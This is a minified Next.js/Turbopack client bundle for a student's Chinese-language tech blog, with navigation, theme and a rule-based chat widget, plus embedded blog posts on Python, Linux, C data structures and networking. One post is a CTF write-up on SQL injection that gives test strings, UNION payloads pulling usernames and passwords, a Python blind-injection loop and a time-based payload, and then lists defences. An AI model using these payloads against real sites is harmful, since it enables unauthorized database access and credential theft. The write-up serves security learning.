(globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push(["object"==typeof document?document.currentScript:void 0,98183,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var n={assign:function(){return l},searchParamsToUrlQuery:function(){return a},urlQueryToSearchParams:function(){return i}};for(var o in n)Object.defineProperty(r,o,{enumerable:!0,get:n[o]});function a(e){let t={};for(let[r,n]of e.entries()){let e=t[r];void 0===e?t[r]=n:Array.isArray(e)?e.push(n):t[r]=[e,n]}return t}function s(e){return"string"==typeof e?e:("number"!=typeof e||isNaN(e))&&"boolean"!=typeof e?"":String(e)}function i(e){let t=new URLSearchParams;for(let[r,n]of Object.entries(e))if(Array.isArray(n))for(let e of n)t.append(r,s(e));else t.set(r,s(n));return t}function l(e,...t){for(let r of t){for(let t of r.keys())e.delete(t);for(let[t,n]of r.entries())e.append(t,n)}return e}},18967,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var n={DecodeError:function(){return x},MiddlewareNotFoundError:function(){return j},MissingStaticPage:function(){return v},NormalizeError:function(){return b},PageNotFoundError:function(){return y},SP:function(){return m},ST:function(){return g},WEB_VITALS:function(){return a},execOnce:function(){return s},getDisplayName:function(){return d},getLocationOrigin:function(){return c},getURL:function(){return u},isAbsoluteUrl:function(){return l},isResSent:function(){return h},loadGetInitialProps:function(){return f},normalizeRepeatedSlashes:function(){return p},stringifyError:function(){return w}};for(var o in n)Object.defineProperty(r,o,{enumerable:!0,get:n[o]});let a=["CLS","FCP","FID","INP","LCP","TTFB"];function s(e){let t,r=!1;return(...n)=>(r||(r=!0,t=e(...n)),t)}let i=/^[a-zA-Z][a-zA-Z\d+\-.]*?:/,l=e=>i.test(e);function c(){let{protocol:e,hostname:t,port:r}=window.location;return`${e}//${t}${r?":"+r:""}`}function u(){let{href:e}=window.location,t=c();return e.substring(t.length)}function d(e){return"string"==typeof e?e:e.displayName||e.name||"Unknown"}function h(e){return e.finished||e.headersSent}function p(e){let t=e.split("?");return t[0].replace(/\\/g,"/").replace(/\/\/+/g,"/")+(t[1]?`?${t.slice(1).join("?")}`:"")}async function f(e,t){let r=t.res||t.ctx&&t.ctx.res;if(!e.getInitialProps)return t.ctx&&t.Component?{pageProps:await f(t.Component,t.ctx)}:{};let n=await e.getInitialProps(t);if(r&&h(r))return n;if(!n)throw Object.defineProperty(Error(`"${d(e)}.getInitialProps()" should resolve to an object. But found "${n}" instead.`),"__NEXT_ERROR_CODE",{value:"E1025",enumerable:!1,configurable:!0});return n}let m="u">typeof performance,g=m&&["mark","measure","getEntriesByName"].every(e=>"function"==typeof performance[e]);class x extends Error{}class b extends Error{}class y extends Error{constructor(e){super(),this.code="ENOENT",this.name="PageNotFoundError",this.message=`Cannot find module for page: ${e}`}}class v extends Error{constructor(e,t){super(),this.message=`Failed to load static file for page: ${e} ${t}`}}class j extends Error{constructor(){super(),this.code="ENOENT",this.message="Cannot find the middleware module"}}function w(e){return JSON.stringify({message:e.message,stack:e.stack})}},33525,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0}),Object.defineProperty(r,"warnOnce",{enumerable:!0,get:function(){return n}});let n=e=>{}},70326,e=>{"use strict";let t=[{id:"python-basics",title:"Python 入门：从零开始的编程之旅",summary:"本文将带你从零开始学习 Python 编程，涵盖变量、数据类型、控制流和函数等基础概念。",content:`# Python 入门：从零开始的编程之旅

## 什么是 Python？

Python 是一种高级编程语言，以其简洁易读的语法著称。它广泛应用于 Web 开发、数据分析、人工智能和网络安全等领域。

## 环境搭建

首先，你需要安装 Python。访问 [python.org](https://python.org) 下载最新版本。

\`\`\`bash
# 验证安装
python --version
\`\`\`

## Hello World

让我们从最经典的程序开始：

\`\`\`python
print("Hello, World!")
\`\`\`

## 变量与数据类型

Python 是动态类型语言，不需要声明变量类型：

\`\`\`python
# 字符串
name = "张三"

# 整数
age = 20

# 浮点数
gpa = 3.8

# 布尔值
is_student = True

# 列表
hobbies = ["编程", "网络安全", "阅读"]
\`\`\`

## 控制流

\`\`\`python
# if-else
if age >= 18:
    print("成年人")
else:
    print("未成年")

# for 循环
for hobby in hobbies:
    print(f"爱好: {hobby}")

# while 循环
count = 0
while count < 5:
    print(count)
    count += 1
\`\`\`

## 函数

\`\`\`python
def greet(name):
    return f"你好, {name}!"

message = greet("世界")
print(message)
\`\`\`

## 总结

Python 是一门非常适合初学者的语言。通过本文的学习，你已经掌握了 Python 的基础知识。接下来，你可以深入学习面向对象编程、文件操作、网络编程等高级话题。
`,category:"编程",tags:["Python","入门","编程基础"],date:"2026-03-15",readTime:8,views:1024},{id:"linux-basics",title:"Linux 基础命令速查手册",summary:"整理常用的 Linux 命令，适合日常使用和 CTF 比赛中快速查阅。",content:`# Linux 基础命令速查手册

## 文件操作

\`\`\`bash
# 列出文件
ls -la

# 切换目录
cd /path/to/dir

# 创建目录
mkdir -p dir1/dir2

# 复制文件
cp source.txt dest.txt

# 移动/重命名
mv old.txt new.txt

# 删除文件
rm file.txt

# 查看文件内容
cat file.txt
less file.txt
head -n 20 file.txt
tail -n 20 file.txt
\`\`\`

## 权限管理

\`\`\`bash
# 修改权限
chmod 755 file.sh
chmod +x script.sh

# 修改所有者
chown user:group file.txt
\`\`\`

## 网络相关

\`\`\`bash
# 查看网络接口
ifconfig
ip addr

# 测试连通性
ping google.com

# 端口扫描
nmap -sV target.com

# 下载文件
wget https://example.com/file.zip
curl -O https://example.com/file.zip
\`\`\`

## 进程管理

\`\`\`bash
# 查看进程
ps aux
top
htop

# 杀死进程
kill PID
kill -9 PID
\`\`\`

## 用户管理

\`\`\`bash
# 添加用户
sudo useradd -m username

# 修改密码
sudo passwd username

# 切换用户
su - username
\`\`\`
`,category:"网络安全",tags:["Linux","命令行","运维"],date:"2026-04-02",readTime:6,views:856},{id:"ctf-web-sqli",title:"CTF Writeup: SQL注入从入门到实战",summary:"通过几道 CTF 题目，讲解 SQL 注入的基本原理和常见利用方式。",content:`# CTF Writeup: SQL注入从入门到实战

## SQL注入原理

SQL注入是通过在应用程序输入中插入恶意的 SQL 代码片段，使后端数据库执行非预期操作。

## 基本测试

\`\`\`sql
-- 测试是否存在注入
' OR '1'='1
" OR "1"="1
' OR 1=1 --
\`\`\`

## Union 注入

\`\`\`sql
-- 确定列数
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --

-- 联合查询
' UNION SELECT 1,2,3 --
' UNION SELECT username,password,3 FROM users --
\`\`\`

## 盲注

### 布尔盲注

\`\`\`python
import requests

url = "http://target.com/login"

for i in range(1, 100):
    payload = f"' AND SUBSTRING((SELECT password FROM users LIMIT 1),{i},1)='a' --"
    r = requests.get(url, params={"id": payload})
    if "Welcome" in r.text:
        print(f"Found character at position {i}: a")
\`\`\`

### 时间盲注

\`\`\`sql
' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0) --
\`\`\`

## 防御方法

1. 使用参数化查询
2. 使用 ORM
3. 输入验证和过滤
4. 最小权限原则

\`\`\`python
# 安全的参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
\`\`\`
`,category:"网络安全",tags:["CTF","SQL注入","Web安全","Writeup"],date:"2026-05-10",readTime:12,views:2048},{id:"data-structures-intro",title:"数据结构入门：链表与栈的实现",summary:"用 C 语言实现链表和栈的基本操作，理解数据结构的底层原理。",content:`# 数据结构入门：链表与栈的实现

## 链表

链表是一种线性数据结构，每个节点包含数据和指向下一个节点的指针。

\`\`\`c
#include <stdio.h>
#include <stdlib.h>

typedef struct Node {
    int data;
    struct Node* next;
} Node;

// 创建新节点
Node* createNode(int data) {
    Node* newNode = (Node*)malloc(sizeof(Node));
    newNode->data = data;
    newNode->next = NULL;
    return newNode;
}

// 头部插入
void insertHead(Node** head, int data) {
    Node* newNode = createNode(data);
    newNode->next = *head;
    *head = newNode;
}

// 打印链表
void printList(Node* head) {
    Node* current = head;
    while (current != NULL) {
        printf("%d -> ", current->data);
        current = current->next;
    }
    printf("NULL\\n");
}

int main() {
    Node* head = NULL;
    insertHead(&head, 3);
    insertHead(&head, 2);
    insertHead(&head, 1);
    printList(head); // 1 -> 2 -> 3 -> NULL
    return 0;
}
\`\`\`

## 栈

栈是一种后进先出（LIFO）的数据结构。

\`\`\`c
#define MAX 100

typedef struct {
    int items[MAX];
    int top;
} Stack;

void initStack(Stack* s) {
    s->top = -1;
}

int isEmpty(Stack* s) {
    return s->top == -1;
}

void push(Stack* s, int value) {
    if (s->top < MAX - 1) {
        s->items[++(s->top)] = value;
    }
}

int pop(Stack* s) {
    if (!isEmpty(s)) {
        return s->items[(s->top)--];
    }
    return -1;
}
\`\`\`
`,category:"编程",tags:["数据结构","C语言","链表","栈"],date:"2026-04-20",readTime:10,views:678},{id:"web-dev-react-nextjs",title:"使用 Next.js 构建个人博客",summary:"记录使用 Next.js + TypeScript + Tailwind CSS 构建个人博客的完整过程。",content:`# 使用 Next.js 构建个人博客

## 为什么选择 Next.js？

Next.js 是 React 的全栈框架，提供了：
- 服务端渲染（SSR）
- 静态生成（SSG）
- 文件系统路由
- API 路由
- 图片优化

## 项目初始化

\`\`\`bash
npx create-next-app@latest blog --typescript --tailwind --app
\`\`\`

## 目录结构

\`\`\`
blog/
├── src/
│   ├── app/          # 页面路由
│   ├── components/   # 组件
│   ├── data/         # 数据文件
│   └── lib/          # 工具函数
├── public/           # 静态资源
└── package.json
\`\`\`

## 关键代码

### 动态路由

\`\`\`typescript
// src/app/blog/[slug]/page.tsx
export default async function Post({ params }: { params: { slug: string } }) {
  const post = await getPost(params.slug);
  return <article>{post.content}</article>;
}
\`\`\`

### MDX 渲染

使用 react-markdown 将 Markdown 转换为 HTML，配合 rehype-highlight 实现代码高亮。

## 部署

推荐部署到 Vercel，零配置即可部署 Next.js 应用。
`,category:"开发",tags:["Next.js","React","TypeScript","博客"],date:"2026-06-01",readTime:7,views:1536},{id:"network-basics",title:"计算机网络基础：TCP/IP 协议详解",summary:"深入理解 TCP/IP 协议栈的工作原理，为网络安全学习打下基础。",content:`# 计算机网络基础：TCP/IP 协议详解

## OSI 七层模型

1. 物理层
2. 数据链路层
3. 网络层
4. 传输层
5. 会话层
6. 表示层
7. 应用层

## TCP 三次握手

\`\`\`
客户端 -> SYN -> 服务器
客户端 <- SYN+ACK <- 服务器
客户端 -> ACK -> 服务器
\`\`\`

## TCP 四次挥手

\`\`\`
客户端 -> FIN -> 服务器
客户端 <- ACK <- 服务器
客户端 <- FIN <- 服务器
客户端 -> ACK -> 服务器
\`\`\`

## 常见端口

| 端口 | 协议 | 用途 |
|------|------|------|
| 21   | FTP  | 文件传输 |
| 22   | SSH  | 远程登录 |
| 80   | HTTP | 网页浏览 |
| 443  | HTTPS| 加密网页 |
| 3306 | MySQL| 数据库 |

## 抓包分析

使用 Wireshark 进行网络抓包，可以直观地观察协议交互过程。
`,category:"网络安全",tags:["网络","TCP/IP","基础"],date:"2026-05-25",readTime:9,views:912}];e.s(["blogPosts",0,t,"projects",0,[{id:"personal-blog",name:"个人博客系统",description:"使用 Next.js + TypeScript + Tailwind CSS 构建的全功能个人技术博客，支持 Markdown 渲染、暗色模式、搜索和评论。",techStack:["Next.js","TypeScript","Tailwind CSS","React"],image:"/projects/blog.png",github:"https://github.com/Yang-yubo/blog",demo:"https://yourblog.vercel.app"},{id:"ctf-toolkit",name:"CTF 工具箱",description:"集成常用 CTF 工具脚本的 Python 工具包，支持编解码、哈希计算、进制转换等功能。",techStack:["Python","Flask","SQLite"],image:"/projects/ctf.png",github:"https://github.com/Yang-yubo/ctf-toolkit",demo:""},{id:"python-automation",name:"Python 自动化工具",description:"一系列 Python 自动化脚本，包括文件整理、批量重命名、网络扫描和数据抓取。",techStack:["Python","Requests","BeautifulSoup"],image:"/projects/automation.png",github:"https://github.com/Yang-yubo/py-automation",demo:""},{id:"network-scanner",name:"网络端口扫描器",description:"基于 Python 的多线程端口扫描工具，支持服务识别和操作系统指纹检测。",techStack:["Python","Socket","Threading"],image:"/projects/scanner.png",github:"https://github.com/Yang-yubo/net-scanner",demo:""}],"siteConfig",0,{name:"哲哲",author:"哲哲",description:"学无止境",github:"https://github.com/Yang-yubo",email:"yangyubo0113@gmail.com",avatar:"/avatar.jpg",school:"漯河食品工程职业大学",major:"计算机专业",year:"大二在读",direction:"软件开发 & 网络安全",bio:"我是一名计算机专业的大学生，对软件开发和网络安全充满热情。从大一接触 Python 开始，我便踏上了技术学习之路。目前我正在深入学习数据结构、Web 开发和网络安全相关知识，同时积极参加 CTF 比赛来锻炼实战能力。我希望未来能成为一名优秀的软件开发工程师或网络安全工程师。",categories:["全部","编程","网络安全","开发"],blogCategories:["Python","C语言","数据结构","Web开发","网络安全","Linux"]}])},95057,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var n={formatUrl:function(){return i},formatWithValidation:function(){return c},urlObjectKeys:function(){return l}};for(var o in n)Object.defineProperty(r,o,{enumerable:!0,get:n[o]});let a=e.r(90809)._(e.r(98183)),s=/https?|ftp|gopher|file/;function i(e){let{auth:t,hostname:r}=e,n=e.protocol||"",o=e.pathname||"",i=e.hash||"",l=e.query||"",c=!1;t=t?encodeURIComponent(t).replace(/%3A/i,":")+"@":"",e.host?c=t+e.host:r&&(c=t+(~r.indexOf(":")?`[${r}]`:r),e.port&&(c+=":"+e.port)),l&&"object"==typeof l&&(l=String(a.urlQueryToSearchParams(l)));let u=e.search||l&&`?${l}`||"";return n&&!n.endsWith(":")&&(n+=":"),e.slashes||(!n||s.test(n))&&!1!==c?(c="//"+(c||""),o&&"/"!==o[0]&&(o="/"+o)):c||(c=""),i&&"#"!==i[0]&&(i="#"+i),u&&"?"!==u[0]&&(u="?"+u),o=o.replace(/[?#]/g,encodeURIComponent),u=u.replace("#","%23"),`${n}${c}${o}${u}${i}`}let l=["auth","hash","host","hostname","href","path","pathname","port","protocol","query","search","slashes"];function c(e){return i(e)}},18581,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0}),Object.defineProperty(r,"useMergedRef",{enumerable:!0,get:function(){return o}});let n=e.r(71645);function o(e,t){let r=(0,n.useRef)(null),o=(0,n.useRef)(null);return(0,n.useCallback)(n=>{if(null===n){let e=r.current;e&&(r.current=null,e());let t=o.current;t&&(o.current=null,t())}else e&&(r.current=a(e,n)),t&&(o.current=a(t,n))},[e,t])}function a(e,t){if("function"!=typeof e)return e.current=t,()=>{e.current=null};{let r=e(t);return"function"==typeof r?r:()=>e(null)}}("function"==typeof r.default||"object"==typeof r.default&&null!==r.default)&&void 0===r.default.__esModule&&(Object.defineProperty(r.default,"__esModule",{value:!0}),Object.assign(r.default,r),t.exports=r.default)},73668,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0}),Object.defineProperty(r,"isLocalURL",{enumerable:!0,get:function(){return a}});let n=e.r(18967),o=e.r(52817);function a(e){if(!(0,n.isAbsoluteUrl)(e))return!0;try{let t=(0,n.getLocationOrigin)(),r=new URL(e,t);return r.origin===t&&(0,o.hasBasePath)(r.pathname)}catch(e){return!1}}},84508,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0}),Object.defineProperty(r,"errorOnce",{enumerable:!0,get:function(){return n}});let n=e=>{}},22016,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var n={default:function(){return x},useLinkStatus:function(){return y}};for(var o in n)Object.defineProperty(r,o,{enumerable:!0,get:n[o]});let a=e.r(90809),s=e.r(43476),i=a._(e.r(71645)),l=e.r(95057),c=e.r(8372),u=e.r(18581),d=e.r(18967),h=e.r(5550);e.r(33525);let p=e.r(88540),f=e.r(91949),m=e.r(73668),g=e.r(9396);function x(t){var r,n;let o,a,x,[y,v]=(0,i.useOptimistic)(f.IDLE_LINK_STATUS),j=(0,i.useRef)(null),{href:w,as:S,children:N,prefetch:P=null,passHref:C,replace:T,shallow:k,scroll:L,onClick:E,onMouseEnter:M,onTouchStart:O,legacyBehavior:R=!1,onNavigate:I,transitionTypes:_,ref:A,unstable_dynamicOnHover:F,...$}=t;o=N,R&&("string"==typeof o||"number"==typeof o)&&(o=(0,s.jsx)("a",{children:o}));let U=i.default.useContext(c.AppRouterContext),W=!1!==P,B=!1!==P?null===(n=P)||"auto"===n?g.FetchStrategy.PPR:g.FetchStrategy.Full:g.FetchStrategy.PPR,D="string"==typeof(r=S||w)?r:(0,l.formatUrl)(r);if(R){if(o?.$$typeof===Symbol.for("react.lazy"))throw Object.defineProperty(Error("`<Link legacyBehavior>` received a direct child that is either a Server Component, or JSX that was loaded with React.lazy(). This is not supported. Either remove legacyBehavior, or make the direct child a Client Component that renders the Link's `<a>` tag."),"__NEXT_ERROR_CODE",{value:"E863",enumerable:!1,configurable:!0});a=i.default.Children.only(o)}let Q=R?a&&"object"==typeof a&&a.ref:A,z=i.default.useCallback(e=>(null!==U&&(j.current=(0,f.mountLinkInstance)(e,D,U,B,W,v)),()=>{j.current&&((0,f.unmountLinkForCurrentNavigation)(j.current),j.current=null),(0,f.unmountPrefetchableInstance)(e)}),[W,D,U,B,v]),K={ref:(0,u.useMergedRef)(z,Q),onClick(t){R||"function"!=typeof E||E(t),R&&a.props&&"function"==typeof a.props.onClick&&a.props.onClick(t),!U||t.defaultPrevented||function(t,r,n,o,a,s,l){if("u">typeof window){let c,{nodeName:u}=t.currentTarget;if("A"===u.toUpperCase()&&((c=t.currentTarget.getAttribute("target"))&&"_self"!==c||t.metaKey||t.ctrlKey||t.shiftKey||t.altKey||t.nativeEvent&&2===t.nativeEvent.which)||t.currentTarget.hasAttribute("download"))return;if(!(0,m.isLocalURL)(r)){o&&(t.preventDefault(),location.replace(r));return}if(t.preventDefault(),s){let e=!1;if(s({preventDefault:()=>{e=!0}}),e)return}let{dispatchNavigateAction:d}=e.r(99781);i.default.startTransition(()=>{d(r,o?"replace":"push",!1===a?p.ScrollBehavior.NoScroll:p.ScrollBehavior.Default,n.current,l)})}}(t,D,j,T,L,I,_)},onMouseEnter(e){R||"function"!=typeof M||M(e),R&&a.props&&"function"==typeof a.props.onMouseEnter&&a.props.onMouseEnter(e),U&&W&&(0,f.onNavigationIntent)(e.currentTarget,!0===F)},onTouchStart:function(e){R||"function"!=typeof O||O(e),R&&a.props&&"function"==typeof a.props.onTouchStart&&a.props.onTouchStart(e),U&&W&&(0,f.onNavigationIntent)(e.currentTarget,!0===F)}};return(0,d.isAbsoluteUrl)(D)?K.href=D:R&&!C&&("a"!==a.type||"href"in a.props)||(K.href=(0,h.addBasePath)(D)),x=R?i.default.cloneElement(a,K):(0,s.jsx)("a",{...$,...K,children:o}),(0,s.jsx)(b.Provider,{value:y,children:x})}e.r(84508);let b=(0,i.createContext)(f.IDLE_LINK_STATUS),y=()=>(0,i.useContext)(b);("function"==typeof r.default||"object"==typeof r.default&&null!==r.default)&&void 0===r.default.__esModule&&(Object.defineProperty(r.default,"__esModule",{value:!0}),Object.assign(r.default,r),t.exports=r.default)},59919,e=>{"use strict";var t=e.i(43476),r=e.i(71645);let n=(0,r.createContext)({theme:"dark",toggleTheme:()=>{}});e.s(["ThemeProvider",0,function({children:e}){let[o,a]=(0,r.useState)("dark");return(0,r.useEffect)(()=>{let e=localStorage.getItem("theme");e?a(e):window.matchMedia("(prefers-color-scheme: light)").matches&&a("light")},[]),(0,r.useEffect)(()=>{let e=document.documentElement;"dark"===o?e.classList.add("dark"):e.classList.remove("dark"),localStorage.setItem("theme",o)},[o]),(0,t.jsx)(n.Provider,{value:{theme:o,toggleTheme:()=>a(e=>"dark"===e?"light":"dark")},children:e})},"useTheme",0,()=>(0,r.useContext)(n)])},18566,(e,t,r)=>{t.exports=e.r(76562)},45678,e=>{"use strict";var t=e.i(43476),r=e.i(22016),n=e.i(71645),o=e.i(18566),a=e.i(59919);let s=[{href:"/",label:"首页"},{href:"/about",label:"关于"},{href:"/blog",label:"博客"},{href:"/tools",label:"工具"},{href:"/ctf",label:"CTF"},{href:"/contact",label:"联系"}];e.s(["default",0,function(){let[e,i]=(0,n.useState)(!1),[l,c]=(0,n.useState)(!1),{theme:u,toggleTheme:d}=(0,a.useTheme)(),h=(0,o.usePathname)();return(0,n.useEffect)(()=>{let e=()=>c(window.scrollY>20);return window.addEventListener("scroll",e),()=>window.removeEventListener("scroll",e)},[]),(0,n.useEffect)(()=>{i(!1)},[h]),(0,t.jsx)("nav",{className:`fixed top-0 left-0 right-0 z-50 transition-all duration-300 ${l?"bg-nav-bg/95 backdrop-blur-xl border-b border-card-border shadow-sm":"bg-transparent"}`,children:(0,t.jsxs)("div",{className:"mx-auto max-w-6xl px-4 sm:px-6",children:[(0,t.jsxs)("div",{className:`flex items-center justify-between transition-all duration-300 ${l?"h-14":"h-16"}`,children:[(0,t.jsxs)(r.default,{href:"/",className:"text-lg font-bold tracking-tight group",children:[(0,t.jsx)("span",{className:"text-accent group-hover:text-accent-hover transition-colors",children:"<"}),(0,t.jsx)("span",{className:"group-hover:text-accent transition-colors",children:"TechSpace"}),(0,t.jsx)("span",{className:"text-accent group-hover:text-accent-hover transition-colors",children:" />"})]}),(0,t.jsxs)("div",{className:"hidden md:flex items-center gap-0.5",children:[s.map(e=>{let n=h===e.href||"/"!==e.href&&h.startsWith(e.href);return(0,t.jsx)(r.default,{href:e.href,className:`relative px-3.5 py-2 text-sm rounded-lg transition-all ${n?"text-accent font-medium bg-accent/10":"text-muted hover:text-foreground hover:bg-card/80"}`,children:e.label},e.href)}),(0,t.jsx)("button",{onClick:d,className:"ml-2 p-2 rounded-lg text-muted hover:text-foreground hover:bg-card/80 transition-all hover:rotate-12","aria-label":"切换主题",children:"dark"===u?(0,t.jsxs)("svg",{xmlns:"http://www.w3.org/2000/svg",width:"18",height:"18",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,t.jsx)("circle",{cx:"12",cy:"12",r:"5"}),(0,t.jsx)("path",{d:"M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"})]}):(0,t.jsx)("svg",{xmlns:"http://www.w3.org/2000/svg",width:"18",height:"18",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:(0,t.jsx)("path",{d:"M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"})})})]}),(0,t.jsxs)("div",{className:"flex items-center gap-2 md:hidden",children:[(0,t.jsx)("button",{onClick:d,className:"p-2 rounded-lg text-muted hover:text-foreground","aria-label":"切换主题",children:"dark"===u?"☀️":"🌙"}),(0,t.jsx)("button",{onClick:()=>i(!e),className:"p-2 rounded-lg text-muted hover:text-foreground","aria-label":"菜单",children:e?(0,t.jsx)("svg",{xmlns:"http://www.w3.org/2000/svg",width:"22",height:"22",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,t.jsx)("path",{d:"M18 6L6 18M6 6l12 12"})}):(0,t.jsx)("svg",{xmlns:"http://www.w3.org/2000/svg",width:"22",height:"22",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,t.jsx)("path",{d:"M3 12h18M3 6h18M3 18h18"})})})]})]}),e&&(0,t.jsx)("div",{className:"md:hidden pb-4 animate-fade-in border-t border-card-border pt-2 mt-1",children:s.map(e=>{let n=h===e.href||"/"!==e.href&&h.startsWith(e.href);return(0,t.jsx)(r.default,{href:e.href,onClick:()=>i(!1),className:`block px-3 py-2.5 text-sm rounded-lg transition-all ${n?"text-accent font-medium bg-accent/10":"text-muted hover:text-foreground hover:bg-card"}`,children:e.label},e.href)})})]})})}])},96936,e=>{"use strict";var t=e.i(43476),r=e.i(71645),n=e.i(70326);let o={Python:["Python 基础语法","面向对象编程","文件操作","网络编程","数据分析(Pandas/NumPy)","Web框架(Flask/Django)"],Web开发:["HTML/CSS 基础","JavaScript","React 框架","Next.js 全栈","TypeScript","数据库(SQL/NoSQL)"],网络安全:["网络基础(TCP/IP)","Linux 系统","Web 安全基础","SQL注入/XSS/CSRF","渗透测试工具","漏洞挖掘"],Linux:["基础命令","文件权限","Shell 脚本","进程管理","网络配置","服务部署"],数据结构:["数组与链表","栈与队列","树与图","排序算法","搜索算法","动态规划"]};e.s(["default",0,function(){let[e,a]=(0,r.useState)(!1),[s,i]=(0,r.useState)([{role:"assistant",content:"你好！👋 我是 TechSpace 的 AI 助手。你可以问我关于学习路线、技术文章推荐，或者任何技术问题。试试输入你感兴趣的方向吧！"}]),[l,c]=(0,r.useState)(""),[u,d]=(0,r.useState)(!1),h=(0,r.useRef)(null);(0,r.useEffect)(()=>{h.current?.scrollIntoView({behavior:"smooth"})},[s]);let p=()=>{if(!l.trim())return;let e={role:"user",content:l.trim()};i(t=>[...t,e]),c(""),d(!0),setTimeout(()=>{let t=function(e){let t=e.toLowerCase();for(let[e,r]of Object.entries(o))if((t.includes(e.toLowerCase())||t.includes("学习"+e)||t.includes("路线"))&&(t.includes("路线")||t.includes("怎么学")||t.includes("如何学")||t.includes("学习")))return`📚 **${e} 学习路线推荐：**

${r.map((e,t)=>`${t+1}. ${e}`).join("\n")}

建议按顺序逐步学习，每个阶段都配合实战项目来巩固知识。`;let r=n.blogPosts.filter(e=>t.includes(e.category.toLowerCase())||e.tags.some(e=>t.includes(e.toLowerCase()))||t.includes(e.title.toLowerCase()));return r.length>0&&(t.includes("文章")||t.includes("推荐")||t.includes("有什么")||t.includes("推荐"))?`📝 **相关文章推荐：**

${r.slice(0,3).map(e=>`• [${e.title}](/blog/${e.id})
  ${e.summary.slice(0,50)}...`).join("\n\n")}`:t.includes("python")?"🐍 Python 是一门非常适合入门的编程语言。我博客里有多篇 Python 相关文章，涵盖了从基础语法到自动化脚本的内容。建议从变量、控制流和函数开始学习！":t.includes("安全")||t.includes("渗透")||t.includes("漏洞")?"🔒 网络安全是一个广泛的领域。建议先掌握网络基础和 Linux，然后学习常见漏洞类型（SQL注入、XSS、CSRF等）。实战方面可以通过靶场练习来巩固。":t.includes("前端")||t.includes("react")||t.includes("next")?"🌐 前端开发推荐学习路线：HTML/CSS → JavaScript → React → Next.js → TypeScript。Next.js 是很好的全栈框架，适合构建个人博客和作品集。":t.includes("你好")||t.includes("hello")||t.includes("hi")?"你好！👋 我是 TechSpace 的 AI 助手。你可以问我：\n\n• 学习路线推荐（如「Python 怎么学」）\n• 文章推荐（如「推荐网络安全文章」）\n• 技术问题（如「什么是 TCP/IP」）\n\n有什么可以帮到你的？":t.includes("谢谢")||t.includes("感谢")?"不客气！😊 如果还有其他问题，随时问我！":"🤔 感谢你的提问！作为博客 AI 助手，我可以帮你：\n\n• **推荐学习路线** — 输入「Python/Web开发/网络安全 学习路线」\n• **推荐文章** — 输入「推荐 XX 相关文章」\n• **解答技术问题** — 输入具体的技术关键词\n\n试试输入你感兴趣的方向吧！"}(e.content);i(e=>[...e,{role:"assistant",content:t}]),d(!1)},600+800*Math.random())};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)("button",{onClick:()=>a(!e),className:"fixed bottom-6 right-6 z-50 w-14 h-14 rounded-full bg-accent text-white shadow-lg shadow-accent/30 hover:bg-accent-hover transition-all hover:scale-105 flex items-center justify-center","aria-label":"AI 助手",children:e?(0,t.jsx)("svg",{xmlns:"http://www.w3.org/2000/svg",width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,t.jsx)("path",{d:"M18 6L6 18M6 6l12 12"})}):(0,t.jsxs)("svg",{xmlns:"http://www.w3.org/2000/svg",width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,t.jsx)("path",{d:"M12 2a7 7 0 0 1 7 7v1a7 7 0 0 1-14 0V9a7 7 0 0 1 7-7z"}),(0,t.jsx)("path",{d:"M12 17v4"}),(0,t.jsx)("path",{d:"M8 21h8"}),(0,t.jsx)("circle",{cx:"9",cy:"9",r:"1",fill:"currentColor"}),(0,t.jsx)("circle",{cx:"15",cy:"9",r:"1",fill:"currentColor"})]})}),e&&(0,t.jsxs)("div",{className:"fixed bottom-24 right-6 z-50 w-[360px] max-w-[calc(100vw-3rem)] rounded-2xl border border-card-border bg-background shadow-2xl flex flex-col animate-fade-in-up overflow-hidden",style:{height:"500px"},children:[(0,t.jsxs)("div",{className:"px-4 py-3 border-b border-card-border bg-card flex items-center gap-3 shrink-0",children:[(0,t.jsx)("div",{className:"w-8 h-8 rounded-lg bg-accent/10 flex items-center justify-center",children:(0,t.jsx)("span",{className:"text-sm",children:"🤖"})}),(0,t.jsxs)("div",{children:[(0,t.jsx)("h3",{className:"text-sm font-semibold",children:"AI 助手"}),(0,t.jsx)("p",{className:"text-xs text-muted",children:"学习路线 · 文章推荐"})]})]}),(0,t.jsxs)("div",{className:"flex-1 overflow-y-auto p-4 space-y-3",children:[s.map((e,r)=>(0,t.jsx)("div",{className:`flex ${"user"===e.role?"justify-end":"justify-start"}`,children:(0,t.jsx)("div",{className:`max-w-[85%] px-3 py-2 rounded-xl text-sm leading-relaxed ${"user"===e.role?"bg-accent text-white rounded-br-sm":"bg-card border border-card-border rounded-bl-sm"}`,children:(0,t.jsx)("div",{className:"whitespace-pre-wrap",children:e.content})})},r)),u&&(0,t.jsx)("div",{className:"flex justify-start",children:(0,t.jsx)("div",{className:"px-3 py-2 rounded-xl bg-card border border-card-border rounded-bl-sm text-sm text-muted",children:(0,t.jsxs)("span",{className:"inline-flex 